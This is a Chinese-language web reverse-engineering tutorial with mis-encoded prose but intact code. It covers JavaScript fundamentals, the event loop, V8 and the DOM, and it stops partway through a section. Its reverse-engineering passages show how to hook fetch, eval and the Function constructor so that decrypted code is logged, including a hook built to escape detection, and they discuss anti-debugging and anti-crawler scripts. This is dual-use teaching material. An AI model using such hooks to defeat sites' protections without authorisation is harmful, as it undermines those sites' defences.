// const: å—ä½œç”¨åŸŸï¼Œå¸¸é‡ï¼ˆå¼•ç”¨ä¸å¯å˜ï¼‰
const z = 1;
// z = 2;  // é”™è¯¯ï¼šä¸èƒ½é‡æ–°èµ‹å€¼

const obj = { name: &quot;John&quot; };
obj.name = &quot;Jane&quot;; // å¯ä»¥ä¿®æ”¹å¯¹è±¡å±æ€§
// obj = {};  // é”™è¯¯ï¼šä¸èƒ½é‡æ–°èµ‹å€¼
</code></pre>
<hr />
<h2>ä½œç”¨åŸŸä¸é—­åŒ…</h2>
<h3>ä½œç”¨åŸŸé“¾</h3>
<pre><code class="language-javascript">let global = &quot;global&quot;;

function outer() {
  let outerVar = &quot;outer&quot;;

  function inner() {
    let innerVar = &quot;inner&quot;;
    console.log(global); // &quot;global&quot;
    console.log(outerVar); // &quot;outer&quot;
    console.log(innerVar); // &quot;inner&quot;
  }

  inner();
}

outer();
</code></pre>
<h3>é—­åŒ…ï¼ˆClosureï¼‰</h3>
<pre><code class="language-javascript">function createCounter() {
  let count = 0;

  return {
    increment: function () {
      count++;
      return count;
    },
    decrement: function () {
      count--;
      return count;
    },
    getCount: function () {
      return count;
    },
  };
}

let counter = createCounter();
console.log(counter.increment()); // 1
console.log(counter.increment()); // 2
console.log(counter.getCount()); // 2
</code></pre>
<p><strong>åœ¨é€†å‘ä¸­çš„åº”ç”¨</strong>ï¼šå¾ˆå¤š JS åŠ å¯†å‡½æ•°ä½¿ç”¨é—­åŒ…æ¥éšè—å¯†é’¥ã€‚</p>
<hr />
<h2>this å…³é”®å­—</h2>
<h3>this çš„ç»‘å®šè§„åˆ™</h3>
<pre><code class="language-javascript">// 1. é»˜è®¤ç»‘å®š - æŒ‡å‘å…¨å±€å¯¹è±¡ï¼ˆä¸¥æ ¼æ¨¡å¼ä¸‹ä¸º undefinedï¼‰
function defaultBinding() {
  console.log(this); // window (æµè§ˆå™¨) æˆ– global (Node.js)
}

// 2. éšå¼ç»‘å®š - æŒ‡å‘è°ƒç”¨å¯¹è±¡
let obj = {
  name: &quot;John&quot;,
  greet: function () {
    console.log(this.name);
  },
};
obj.greet(); // &quot;John&quot;

// 3. æ˜¾å¼ç»‘å®š - ä½¿ç”¨ call/apply/bind
function greet() {
  console.log(this.name);
}
let person = { name: &quot;Jane&quot; };
greet.call(person); // &quot;Jane&quot;
greet.apply(person); // &quot;Jane&quot;
let boundGreet = greet.bind(person);
boundGreet(); // &quot;Jane&quot;

// 4. new ç»‘å®š - æŒ‡å‘æ–°åˆ›å»ºçš„å¯¹è±¡
function Person(name) {
  this.name = name;
}
let p = new Person(&quot;Bob&quot;);
console.log(p.name); // &quot;Bob&quot;

// 5. ç®­å¤´å‡½æ•° - ç»§æ‰¿å¤–å±‚ä½œç”¨åŸŸçš„ this
let obj2 = {
  name: &quot;Alice&quot;,
  greet: () =&gt; {
    console.log(this.name); // undefinedï¼ˆç»§æ‰¿å¤–å±‚ thisï¼‰
  },
  greet2: function () {
    setTimeout(() =&gt; {
      console.log(this.name); // &quot;Alice&quot;ï¼ˆç»§æ‰¿ greet2 çš„ thisï¼‰
    }, 100);
  },
};
</code></pre>
<hr />
<h2>åŸå‹ä¸åŸå‹é“¾</h2>
<h3>åŸå‹åŸºç¡€</h3>
<pre><code class="language-javascript">function Person(name) {
  this.name = name;
}

// åœ¨åŸå‹ä¸Šå®šä¹‰æ–¹æ³•
Person.prototype.greet = function () {
  console.log(`Hello, I'm ${this.name}`);
};

let p1 = new Person(&quot;John&quot;);
let p2 = new Person(&quot;Jane&quot;);

p1.greet(); // &quot;Hello, I'm John&quot;
p2.greet(); // &quot;Hello, I'm Jane&quot;

// p1 å’Œ p2 å…±äº«åŒä¸€ä¸ª greet æ–¹æ³•
console.log(p1.greet === p2.greet); // true
</code></pre>
<h3>åŸå‹é“¾</h3>
<pre><code class="language-javascript">let obj = { a: 1 };

// åŸå‹é“¾ï¼šobj -&gt; Object.prototype -&gt; null
console.log(obj.__proto__ === Object.prototype); // true
console.log(Object.prototype.__proto__); // null

// å±æ€§æŸ¥æ‰¾ä¼šæ²¿ç€åŸå‹é“¾å‘ä¸ŠæŸ¥æ‰¾
console.log(obj.toString); // [Function: toString] (æ¥è‡ª Object.prototype)
</code></pre>
<h3>Class è¯­æ³•ï¼ˆES6+ï¼‰</h3>
<pre><code class="language-javascript">class Person {
  constructor(name) {
    this.name = name;
  }

  greet() {
    console.log(`Hello, I'm ${this.name}`);
  }

  static species() {
    return &quot;Homo sapiens&quot;;
  }
}

class Student extends Person {
  constructor(name, grade) {
    super(name);
    this.grade = grade;
  }

  study() {
    console.log(`${this.name} is studying in grade ${this.grade}`);
  }
}

let student = new Student(&quot;Alice&quot;, 10);
student.greet(); // &quot;Hello, I'm Alice&quot;
student.study(); // &quot;Alice is studying in grade 10&quot;
</code></pre>
<hr />
<h2>å¼‚æ­¥ç¼–ç¨‹</h2>
<h3>å›è°ƒå‡½æ•°ï¼ˆCallbackï¼‰</h3>
<pre><code class="language-javascript">function fetchData(callback) {
  setTimeout(() =&gt; {
    callback(&quot;Data loaded&quot;);
  }, 1000);
}

fetchData((data) =&gt; {
  console.log(data); // &quot;Data loaded&quot; (1ç§’å)
});
</code></pre>
<h3>Promise</h3>
<pre><code class="language-javascript">function fetchData() {
  return new Promise((resolve, reject) =&gt; {
    setTimeout(() =&gt; {
      let success = true;
      if (success) {
        resolve(&quot;Data loaded&quot;);
      } else {
        reject(&quot;Error occurred&quot;);
      }
    }, 1000);
  });
}

// ä½¿ç”¨ .then()
fetchData()
  .then((data) =&gt; console.log(data))
  .catch((error) =&gt; console.error(error));

// Promise é“¾å¼è°ƒç”¨
fetch(&quot;https://api.example.com/data&quot;)
  .then((response) =&gt; response.json())
  .then((data) =&gt; console.log(data))
  .catch((error) =&gt; console.error(error));
</code></pre>
<h3>Async/Awaitï¼ˆES2017+ï¼‰</h3>
<pre><code class="language-javascript">async function loadData() {
  try {
    let response = await fetch(&quot;https://api.example.com/data&quot;);
    let data = await response.json();
    console.log(data);
  } catch (error) {
    console.error(error);
  }
}

loadData();
</code></pre>
<hr />
<h2>å¸¸ç”¨å†…ç½®å¯¹è±¡å’Œæ–¹æ³•</h2>
<h3>Array æ–¹æ³•</h3>
<pre><code class="language-javascript">let arr = [1, 2, 3, 4, 5];

// éå†
arr.forEach((item) =&gt; console.log(item));

// æ˜ å°„
let doubled = arr.map((x) =&gt; x * 2); // [2, 4, 6, 8, 10]

// è¿‡æ»¤
let evens = arr.filter((x) =&gt; x % 2 === 0); // [2, 4]

// å½’çº¦
let sum = arr.reduce((acc, x) =&gt; acc + x, 0); // 15

// æŸ¥æ‰¾
let found = arr.find((x) =&gt; x &gt; 3); // 4
let index = arr.findIndex((x) =&gt; x &gt; 3); // 3

// åˆ¤æ–­
let hasEven = arr.some((x) =&gt; x % 2 === 0); // true
let allPositive = arr.every((x) =&gt; x &gt; 0); // true

// å±•å¹³
let nested = [1, [2, [3, 4]]];
let flat = nested.flat(2); // [1, 2, 3, 4]
</code></pre>
<h3>String æ–¹æ³•</h3>
<pre><code class="language-javascript">let str = &quot;Hello World&quot;;

// æŸ¥æ‰¾
str.indexOf(&quot;World&quot;); // 6
str.includes(&quot;World&quot;); // true
str.startsWith(&quot;Hello&quot;); // true
str.endsWith(&quot;World&quot;); // true

// æå–
str.substring(0, 5); // &quot;Hello&quot;
str.slice(0, 5); // &quot;Hello&quot;
str.substr(0, 5); // &quot;Hello&quot; (å·²åºŸå¼ƒ)

// æ›¿æ¢
str.replace(&quot;World&quot;, &quot;JavaScript&quot;); // &quot;Hello JavaScript&quot;
str.replaceAll(&quot;l&quot;, &quot;L&quot;); // &quot;HeLLo WorLd&quot;

// åˆ†å‰²ä¸è¿æ¥
str.split(&quot; &quot;); // [&quot;Hello&quot;, &quot;World&quot;]
[&quot;Hello&quot;, &quot;World&quot;].join(&quot;-&quot;); // &quot;Hello-World&quot;

// å¤§å°å†™
str.toLowerCase(); // &quot;hello world&quot;
str.toUpperCase(); // &quot;HELLO WORLD&quot;

// å»ç©ºæ ¼
&quot;  hello  &quot;.trim(); // &quot;hello&quot;
&quot;  hello  &quot;.trimStart(); // &quot;hello  &quot;
&quot;  hello  &quot;.trimEnd(); // &quot;  hello&quot;
</code></pre>
<h3>Object æ–¹æ³•</h3>
<pre><code class="language-javascript">let obj = { a: 1, b: 2, c: 3 };

// è·å–é”®ã€å€¼ã€æ¡ç›®
Object.keys(obj); // [&quot;a&quot;, &quot;b&quot;, &quot;c&quot;]
Object.values(obj); // [1, 2, 3]
Object.entries(obj); // [[&quot;a&quot;, 1], [&quot;b&quot;, 2], [&quot;c&quot;, 3]]

// åˆå¹¶å¯¹è±¡
let merged = Object.assign({}, obj, { d: 4 }); // {a: 1, b: 2, c: 3, d: 4}
let spread = { ...obj, d: 4 }; // {a: 1, b: 2, c: 3, d: 4}

// å†»ç»“å¯¹è±¡
Object.freeze(obj);
obj.a = 100; // æ— æ•ˆ
console.log(obj.a); // 1

// å¯†å°å¯¹è±¡
Object.seal(obj);
obj.a = 100; // å¯ä»¥ä¿®æ”¹
delete obj.a; // æ— æ•ˆ
</code></pre>
<hr />
<h2>æ­£åˆ™è¡¨è¾¾å¼</h2>
<h3>åŸºæœ¬è¯­æ³•</h3>
<pre><code class="language-javascript">// åˆ›å»ºæ­£åˆ™
let regex1 = /pattern/gi;
let regex2 = new RegExp(&quot;pattern&quot;, &quot;gi&quot;);

// æ ‡å¿—
// g - å…¨å±€åŒ¹é…
// i - å¿½ç•¥å¤§å°å†™
// m - å¤šè¡ŒåŒ¹é…
// s - . åŒ¹é…æ¢è¡Œç¬¦
// u - Unicode æ¨¡å¼
// y - ç²˜æ€§åŒ¹é…

// å¸¸ç”¨æ–¹æ³•
let str = &quot;Hello World 123&quot;;

str.match(/\d+/); // [&quot;123&quot;]
str.search(/World/); // 6
str.replace(/\d+/, &quot;456&quot;); // &quot;Hello World 456&quot;
str.split(/\s+/); // [&quot;Hello&quot;, &quot;World&quot;, &quot;123&quot;]

/World/.test(str); // true
/\d+/.exec(str); // [&quot;123&quot;, index: 12, input: &quot;Hello World 123&quot;]
</code></pre>
<h3>å¸¸ç”¨æ¨¡å¼</h3>
<pre><code class="language-javascript">// æ•°å­—
/\d+/  // ä¸€ä¸ªæˆ–å¤šä¸ªæ•°å­—
/^\d+$/  // æ•´è¡Œéƒ½æ˜¯æ•°å­—

// å­—æ¯
/[a-zA-Z]+/  // ä¸€ä¸ªæˆ–å¤šä¸ªå­—æ¯

// é‚®ç®±
/^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/

// URL
/^https?:\/\/.+/

// æ‰‹æœºå·ï¼ˆä¸­å›½ï¼‰
/^1[3-9]\d{9}$/

// æ•è·ç»„
let match = &quot;2024-12-17&quot;.match(/(\d{4})-(\d{2})-(\d{2})/);
// match[0] = &quot;2024-12-17&quot;
// match[1] = &quot;2024&quot;
// match[2] = &quot;12&quot;
// match[3] = &quot;17&quot;
</code></pre>
<hr />
<h2>é”™è¯¯å¤„ç†</h2>
<pre><code class="language-javascript">// try-catch
try {
  // å¯èƒ½å‡ºé”™çš„ä»£ç 
  let result = riskyOperation();
} catch (error) {
  console.error(&quot;Error occurred:&quot;, error.message);
} finally {
  // æ— è®ºæ˜¯å¦å‡ºé”™éƒ½ä¼šæ‰§è¡Œ
  cleanup();
}

// æŠ›å‡ºé”™è¯¯
function divide(a, b) {
  if (b === 0) {
    throw new Error(&quot;Division by zero&quot;);
  }
  return a / b;
}

// è‡ªå®šä¹‰é”™è¯¯
class CustomError extends Error {
  constructor(message) {
    super(message);
    this.name = &quot;CustomError&quot;;
  }
}

throw new CustomError(&quot;Something went wrong&quot;);
</code></pre>
<hr />
<h2>æ¨¡å—åŒ–</h2>
<h3>ES6 æ¨¡å—</h3>
<pre><code class="language-javascript">// math.js
export function add(a, b) {
  return a + b;
}

export const PI = 3.14159;

export default class Calculator {
  // ...
}

// main.js
import Calculator, { add, PI } from &quot;./math.js&quot;;
import * as math from &quot;./math.js&quot;;

console.log(add(1, 2)); // 3
console.log(PI); // 3.14159
let calc = new Calculator();
</code></pre>
<h3>CommonJSï¼ˆNode.jsï¼‰</h3>
<pre><code class="language-javascript">// math.js
function add(a, b) {
  return a + b;
}

module.exports = {
  add,
  PI: 3.14159,
};

// main.js
const math = require(&quot;./math&quot;);
console.log(math.add(1, 2)); // 3
</code></pre>
<hr />
<h2>é€†å‘åˆ†ææŠ€å·§</h2>
<h3>1. æŸ¥æ‰¾åŠ å¯†å‡½æ•°</h3>
<pre><code class="language-javascript">// å¸¸è§çš„åŠ å¯†åº“å…³é”®è¯
// CryptoJS, crypto, encrypt, decrypt, MD5, SHA, AES, RSA

// æœç´¢æŠ€å·§
// åœ¨ DevTools çš„ Sources é¢æ¿ä¸­å…¨å±€æœç´¢è¿™äº›å…³é”®è¯
// Ctrl+Shift+F (Windows) æˆ– Cmd+Opt+F (Mac)
</code></pre>
<h3>2. Hook å‡½æ•°</h3>
<pre><code class="language-javascript">// Hook åŸç”Ÿæ–¹æ³•
const originalFetch = window.fetch;
window.fetch = function (...args) {
  console.log(&quot;Fetch called with:&quot;, args);
  return originalFetch.apply(this, args);
};

// Hook å¯¹è±¡æ–¹æ³•
const originalPush = Array.prototype.push;
Array.prototype.push = function (...items) {
  console.log(&quot;Array push:&quot;, items);
  return originalPush.apply(this, items);
};
</code></pre>
<h3>3. è°ƒè¯•æ··æ·†ä»£ç </h3>
<pre><code class="language-javascript">// ä½¿ç”¨ debugger è¯­å¥
function suspiciousFunction() {
  debugger; // æ‰§è¡Œåˆ°è¿™é‡Œä¼šè‡ªåŠ¨æ–­ç‚¹
  // ...
}

// æ¡ä»¶æ–­ç‚¹
// åœ¨ DevTools ä¸­å³é”®è®¾ç½®æ¡ä»¶æ–­ç‚¹
// ä¾‹å¦‚ï¼šuserId === '12345'

// æ—¥å¿—ç‚¹
// ä¸æš‚åœæ‰§è¡Œï¼Œåªè¾“å‡ºæ—¥å¿—
</code></pre>
<hr />
<h2>ç›¸å…³ç« èŠ‚</h2>
<ul>
<li><a href="#section-9">DOM ä¸ BOM</a></li>
<li><a href="#section-15">æµè§ˆå™¨å¼€å‘è€…å·¥å…·</a></li>
<li><a href="#section-32">JavaScript åæ··æ·†</a></li>
<li><a href="#section-26">è°ƒè¯•æŠ€å·§ä¸æ–­ç‚¹è®¾ç½®</a></li>
</ul>

                                            </div>
                                            
                                            <div class="section" id="section-8">
                                                <h2>[R07] JavaScript Execution Mechanism</h2>
                                                <h1>R07: JavaScript æ‰§è¡Œæœºåˆ¶</h1>
<h2>æ¦‚è¿°</h2>
<p>æ·±å…¥ç†è§£ JavaScript çš„æ‰§è¡Œæœºåˆ¶ï¼ˆäº‹ä»¶å¾ªç¯ã€V8 å¼•æ“ã€ç¼–è¯‘åŸç†ï¼‰å¯¹äºå¤„ç†å¤æ‚çš„åè°ƒè¯•è„šæœ¬ã€åˆ†æå¼‚æ­¥åŠ å¯†é€»è¾‘ä»¥åŠç†è§£æ··æ·†ä»£ç çš„æ§åˆ¶æµè‡³å…³é‡è¦ã€‚</p>
<hr />
<h2>1. å•çº¿ç¨‹ä¸äº‹ä»¶å¾ªç¯ (Event Loop)</h2>
<p>JavaScript æ˜¯å•çº¿ç¨‹çš„ï¼ˆä¸»çº¿ç¨‹ï¼‰ï¼Œä¸ºäº†ä¸é˜»å¡ UI æ¸²æŸ“ï¼Œå®ƒé‡‡ç”¨äº†<strong>äº‹ä»¶å¾ªç¯</strong>æœºåˆ¶æ¥å¤„ç†å¼‚æ­¥ä»»åŠ¡ã€‚</p>
<h3>å®ä»»åŠ¡ (MacroTask) vs å¾®ä»»åŠ¡ (MicroTask)</h3>
<p>è¿™æ˜¯é¢è¯•é¢˜å¸¸å®¢ï¼Œä¹Ÿæ˜¯é€†å‘åˆ†æå¼‚æ­¥ä»£ç æ‰§è¡Œé¡ºåºçš„å…³é”®ã€‚</p>
<ul>
<li><strong>MacroTask (å®ä»»åŠ¡)</strong>: <code>setTimeout</code>, <code>setInterval</code>, <code>setImmediate</code> (Node), I/O, UI Rendering.</li>
<li><strong>MicroTask (å¾®ä»»åŠ¡)</strong>: <code>Promise.then</code>, <code>process.nextTick</code> (Node), <code>MutationObserver</code>.</li>
</ul>
<h3>æ‰§è¡Œé¡ºåº</h3>
<ol>
<li>æ‰§è¡ŒåŒæ­¥ä»£ç ï¼ˆMain Scriptï¼‰ã€‚</li>
<li>æ‰§è¡Œæ‰€æœ‰ <strong>MicroTasks</strong>ï¼ˆæ¸…ç©ºå¾®ä»»åŠ¡é˜Ÿåˆ—ï¼‰ã€‚</li>
<li>æ‰§è¡Œ <strong>ä¸€ä¸ª</strong> MacroTaskã€‚</li>
<li>æ‰§è¡Œæ‰€æœ‰ <strong>MicroTasks</strong>ã€‚</li>
<li>æ›´æ–° UI æ¸²æŸ“ã€‚</li>
<li>å›åˆ°æ­¥éª¤ 3ã€‚</li>
</ol>
<h3>[Reverse Engineering Context] åè°ƒè¯•é™·é˜±</h3>
<p>å¾ˆå¤šåè°ƒè¯•ä»£ç åˆ©ç”¨ MicroTask çš„é«˜ä¼˜å…ˆçº§æ¥å¡æ­»æµè§ˆå™¨æˆ–è€…æ£€æµ‹è°ƒè¯•å™¨ã€‚</p>
<pre><code class="language-javascript">// ç¤ºä¾‹ï¼šåˆ©ç”¨ Event Loop å·®å¼‚æ£€æµ‹ç¯å¢ƒæˆ–åˆ¶é€ æ—¶åºæ··æ·†
console.log(&quot;Start&quot;);

setTimeout(() =&gt; {
  console.log(&quot;Timeout&quot;); // å®ä»»åŠ¡
}, 0);

Promise.resolve().then(() =&gt; {
  console.log(&quot;Promise&quot;); // å¾®ä»»åŠ¡
  // æ¶æ„ä»£ç å¯èƒ½æ’åœ¨è¿™é‡Œï¼Œä¼˜å…ˆäº setTimeout æ‰§è¡Œ
});

console.log(&quot;End&quot;);

// è¾“å‡º: Start -&gt; End -&gt; Promise -&gt; Timeout
</code></pre>
<p>å¦‚æœåœ¨ <code>setTimeout</code> å›è°ƒé‡Œä¸‹äº†æ–­ç‚¹ï¼Œå´å‘ç°åœ¨æ­¤ä¹‹å‰æŸäº›å˜é‡å·²ç»è¢« <code>Promise</code> æ”¹äº†ï¼Œè¿™å°±æ˜¯åŸå› ã€‚</p>
<hr />
<h2>2. V8 å¼•æ“æ¶æ„</h2>
<p>Chrome å’Œ Node.js éƒ½ä½¿ç”¨ V8 å¼•æ“ã€‚</p>
<h3>ç¼–è¯‘æµæ°´çº¿</h3>
<ol>
<li><strong>Parse</strong>: æºç  -&gt; AST (æŠ½è±¡è¯­æ³•æ ‘)ã€‚</li>
<li><strong>Ignition (è§£é‡Šå™¨)</strong>: AST -&gt; Bytecode (å­—èŠ‚ç ) å¹¶æ‰§è¡Œã€‚</li>
<li><strong>TurboFan (ä¼˜åŒ–ç¼–è¯‘å™¨)</strong>: å°†çƒ­ç‚¹ Bytecode ç¼–è¯‘æˆé«˜æ•ˆçš„ Machine Code (æœºå™¨ç )ã€‚</li>
<li><strong>Deoptimization (å»ä¼˜åŒ–)</strong>: å¦‚æœå‡è®¾å¤±è´¥ï¼ˆä¾‹å¦‚å˜é‡ç±»å‹å˜äº†ï¼‰ï¼Œä»æœºå™¨ç é€€å›åˆ°å­—èŠ‚ç ã€‚</li>
</ol>
<h3>[Reverse Engineering Context] JIT å¸¦æ¥çš„ç°è±¡</h3>
<ul>
<li><strong>çƒ­ç‚¹å‡½æ•°</strong>: å¦‚æœä¸€ä¸ªåŠ å¯†å‡½æ•°è¢«é¢‘ç¹è°ƒç”¨ï¼Œå®ƒä¼šè¢«ç¼–è¯‘æˆæå…¶é«˜æ•ˆçš„æ±‡ç¼–ã€‚åœ¨ Profiler ä¸­çœ‹åˆ°æ ‡çº¢çš„å¯èƒ½æ˜¯å…³é”®é€»è¾‘ã€‚</li>
<li><strong>ç±»å‹å˜æ¢</strong>: æ··æ·†ä»£ç æœ‰æ—¶ä¼šæ•…æ„é¢‘ç¹æ”¹å˜å˜é‡ç±»å‹ï¼ˆInt -&gt; String -&gt; Objectï¼‰ï¼Œå¼ºè¿« V8 è¿›è¡Œ Deoptimizationï¼Œå¯¼è‡´ä»£ç æ‰§è¡Œå˜æ…¢ï¼Œå¹²æ‰°æ€§èƒ½åˆ†æï¼Œç”šè‡³åˆ©ç”¨ JIT Bugã€‚</li>
</ul>
<hr />
<h2>3. ä½œç”¨åŸŸé“¾ä¸ä¸Šä¸‹æ–‡</h2>
<h3>æ‰§è¡Œä¸Šä¸‹æ–‡ (Execution Context)</h3>
<p>æ¯å½“ JS å¼•æ“æ‰§è¡Œä»£ç æ—¶ï¼Œéƒ½ä¼šåˆ›å»ºä¸Šä¸‹æ–‡ï¼š</p>
<ul>
<li><strong>Global Context</strong>: å…¨å±€ã€‚</li>
<li><strong>Function Context</strong>: å‡½æ•°è°ƒç”¨æ—¶åˆ›å»ºã€‚</li>
</ul>
<h3>å˜é‡å¯¹è±¡ (VO) ä¸ æ´»åŠ¨å¯¹è±¡ (AO)</h3>
<ul>
<li>å­˜å‚¨å‡½æ•°å†…çš„ arguments, å˜é‡, å†…éƒ¨å‡½æ•°ã€‚</li>
<li>é€†å‘æ—¶ï¼ŒScopes é¢æ¿çœ‹åˆ°çš„ Closure å°±æ˜¯ä¿å­˜äº†å¤–éƒ¨å‡½æ•° AO çš„å¼•ç”¨ã€‚</li>
</ul>
<hr />
<h2>4. åƒåœ¾å›æ”¶ (Garbage Collection)</h2>
<p>V8 ä½¿ç”¨åˆ†ä»£å›æ”¶ç®—æ³•ï¼š</p>
<ul>
<li><strong>æ–°ç”Ÿä»£ (New Space)</strong>: å­˜æ´»æ—¶é—´çŸ­çš„å¯¹è±¡ï¼Œä½¿ç”¨ Scavenge ç®—æ³• (å¤åˆ¶æ¸…é™¤)ã€‚</li>
<li><strong>è€ç”Ÿä»£ (Old Space)</strong>: å­˜æ´»æ—¶é—´é•¿çš„å¯¹è±¡ï¼Œä½¿ç”¨ Mark-Sweep (æ ‡è®°æ¸…é™¤) å’Œ Mark-Compact (æ ‡è®°æ•´ç†)ã€‚</li>
</ul>
<h3>[Reverse Engineering Context] å†…å­˜æ³„æ¼</h3>
<p>å¦‚æœå‘ç°ç½‘é¡µå†…å­˜æŒç»­é£™å‡ï¼Œå¯èƒ½æ˜¯åçˆ¬è™«è„šæœ¬åœ¨æ•…æ„åˆ¶é€ å†…å­˜å‹åŠ›ï¼Œæˆ–è€…ç”±äºé¢‘ç¹åˆ›å»ºæœªé”€æ¯çš„é—­åŒ…å¯¼è‡´ã€‚</p>
<hr />
<h2>5. Eval ä¸ Function æ„é€ å™¨</h2>
<p>åŠ¨æ€æ‰§è¡Œä»£ç çš„ä¸¤ç§æ–¹å¼ï¼Œä¹Ÿæ˜¯æ··æ·†çš„é‡ç¾åŒºã€‚</p>
<pre><code class="language-javascript">eval(&quot;var a = 1;&quot;); // è®¿é—®æœ¬åœ°ä½œç”¨åŸŸ
new Function(&quot;return 1&quot;)(); // åªèƒ½è®¿é—®å…¨å±€ä½œç”¨åŸŸ
</code></pre>
<p><strong>å¯¹æŠ—</strong>: Hook <code>eval</code> å’Œ <code>Function</code> æ˜¯è·å–è§£å¯†åä»£ç çš„æœ€å¿«è·¯å¾„ã€‚</p>
<pre><code class="language-javascript">// Hook eval
window._eval = window.eval;
window.eval = function (str) {
  console.log(&quot;[eval]&quot;, str);
  return window._eval(str);
};

// Hook Function
// æ³¨æ„ï¼šFunction ä¸ä»…ä»…æ˜¯å‡½æ•°ï¼Œå®ƒæœ¬èº«ä¹Ÿæ˜¯æ„é€ å™¨
var _Function = window.Function;
window.Function = function (...args) {
  let body = args[args.length - 1];
  console.log(&quot;[Function]&quot;, body);
  return _Function.apply(this, args);
};
// ä¿æŒåŸå‹é“¾ï¼Œé˜²æ­¢æ£€æµ‹
window.Function.prototype = _Function.prototype;
window.Function.prototype.constructor = window.Function;
</code></pre>
<hr />
<h2>æ€»ç»“</h2>
<p>ç†è§£ JS æ‰§è¡Œæœºåˆ¶è®©æˆ‘ä»¬ä¸ä»…èƒ½çœ‹æ‡‚ä»£ç ï¼Œè¿˜èƒ½çœ‹æ‡‚ä»£ç â€œèƒŒåâ€çš„è¡Œä¸ºâ€”â€”ä¸ºä»€ä¹ˆè¿™é‡Œçš„æ–­ç‚¹è¿›ä¸å»ï¼Ÿä¸ºä»€ä¹ˆè¿™æ®µä»£ç æ‰§è¡Œé¡ºåºå’Œæƒ³çš„ä¸ä¸€æ ·ï¼Ÿä¸ºä»€ä¹ˆå†…å­˜ä¸€ç›´åœ¨æ¶¨ï¼Ÿè¿™äº›é—®é¢˜çš„ç­”æ¡ˆéƒ½åœ¨ Event Loop å’Œ V8 å¼•æ“é‡Œã€‚</p>

                                            </div>
                                            
                                            <div class="section" id="section-9">
                                                <h2>[R08] DOM And BOM</h2>
                                                <h1>R08: DOM ä¸ BOM</h1>
<h2>æ¦‚è¿°</h2>
<p>DOM (æ–‡æ¡£å¯¹è±¡æ¨¡å‹) å’Œ BOM (æµè§ˆå™¨å¯¹è±¡æ¨¡å‹) æ˜¯ JavaScript ä¸ç½‘é¡µå†…å®¹åŠæµè§ˆå™¨çª—å£äº¤äº’çš„æ¥å£ã€‚åœ¨ Web é€†å‘ä¸­ï¼Œç†è§£å®ƒä»¬å¯¹äºå®šä½é¡µé¢å…ƒç´ ã€åˆ†æäº‹ä»¶è§¦å‘é€»è¾‘ä»¥åŠåº”å¯¹åè°ƒè¯•è‡³å…³é‡è¦ã€‚</p>
<hr />
<h2>DOM (Document Object Model)</h2>
<p>DOM å°† HTML æ–‡æ¡£è§£æä¸ºä¸€ä¸ªæ ‘çŠ¶ç»“æ„ï¼ŒJavaScript é€šè¿‡ DOM API æ¥æ“ä½œé¡µé¢å†…å®¹ã€‚</p>
<h3>1. æ ¸å¿ƒæ¦‚å¿µ</h3>
<ul>
<li><strong>DOM Tree</strong>: æ•´ä¸ªæ–‡æ¡£çš„å±‚çº§ç»“æ„ã€‚</li>
<li><strong>Node (èŠ‚ç‚¹)</strong>: æ ‘ä¸­çš„æ¯ä¸ªç»„æˆéƒ¨åˆ†ï¼ˆå…ƒç´ ã€æ–‡æœ¬ã€æ³¨é‡Šç­‰ï¼‰ã€‚</li>
<li><strong>Element (å…ƒç´ )</strong>: HTML æ ‡ç­¾å¯¹åº”çš„èŠ‚ç‚¹ï¼ˆå¦‚ <code>&lt;div&gt;</code>, <code>&lt;body&gt;</code>ï¼‰ã€‚</li>
</ul>
<h3>2. å¸¸ç”¨æ“ä½œ</h3>
<h4>é€‰æ‹©ä¸éå†</h4>
<pre><code class="language-javascript">// é€‰æ‹©å™¨
document.getElementById(&quot;app&quot;); // å”¯ä¸€ ID
document.querySelector(&quot;.class-name&quot;); // ç¬¬ä¸€ä¸ªåŒ¹é…
document.querySelectorAll(&quot;div &gt; span&quot;); // æ‰€æœ‰åŒ¹é…

// éå†
element.parentNode; // çˆ¶èŠ‚ç‚¹
element.children; // å­å…ƒç´ åˆ—è¡¨
element.nextElementSibling; // ä¸‹ä¸€ä¸ªå…„å¼Ÿå…ƒç´ 
</code></pre>
<h4>ä¿®æ”¹ DOM</h4>
<pre><code class="language-javascript">// åˆ›å»º
let newDiv = document.createElement(&quot;div&quot;);
newDiv.innerText = &quot;Injected Content&quot;;

// æ’å…¥
document.body.appendChild(newDiv);

// åˆ é™¤
element.remove();

// å±æ€§æ“ä½œ
input.value = &quot;hacked&quot;;
img.getAttribute(&quot;src&quot;);
</code></pre>
<h3>3. äº‹ä»¶ç³»ç»Ÿ (Event System)</h3>
<p>é€†å‘ä¸­æœ€é‡è¦çš„éƒ¨åˆ†ä¹‹ä¸€ã€‚æŒ‰é’®ç‚¹å‡»è§¦å‘åŠ å¯†ã€è¡¨å•æäº¤è§¦å‘éªŒè¯ï¼ŒèƒŒåéƒ½æ˜¯äº‹ä»¶åœ¨é©±åŠ¨ã€‚</p>
<h4>äº‹ä»¶æµ</h4>
<ol>
<li><strong>æ•è·é˜¶æ®µ (Capturing)</strong>: ä» window å¾€ä¸‹ä¼ å¯¼åˆ°ç›®æ ‡å…ƒç´ ã€‚</li>
<li><strong>ç›®æ ‡é˜¶æ®µ (Target)</strong>: åˆ°è¾¾å®é™…è§¦å‘äº‹ä»¶çš„å…ƒç´ ã€‚</li>
<li><strong>å†’æ³¡é˜¶æ®µ (Bubbling)</strong>: ä»ç›®æ ‡å…ƒç´ å¾€ä¸Šä¼ å¯¼å› windowã€‚</li>
</ol>
<pre><code class="language-javascript">element.addEventListener(&quot;click&quot;, handler, false); // false è¡¨ç¤ºåœ¨å†’æ³¡é˜¶æ®µè§¦å‘ï¼ˆé»˜è®¤ï¼‰
</code></pre>
<h4>[Reverse Engineering Context] å®šä½äº‹ä»¶ç›‘å¬å™¨</h4>
<p><strong>é—®é¢˜</strong>: ç‚¹å‡»ä¸€ä¸ªæŒ‰é’®è§¦å‘äº†åŠ å¯†è¯·æ±‚ï¼Œä»£ç åœ¨å“ªé‡Œï¼Ÿ</p>
<p><strong>æ–¹æ³•</strong>:</p>
<ol>
<li><strong>DevTools -&gt; Elements é¢æ¿</strong>: é€‰ä¸­å…ƒç´ ï¼Œå³ä¾§ &quot;Event Listeners&quot; æ ‡ç­¾ã€‚å¯ä»¥çœ‹åˆ°ç»‘å®šçš„äº‹ä»¶ï¼Œç‚¹å‡»é“¾æ¥è·³è½¬åˆ° JS ä»£ç ã€‚<ul>
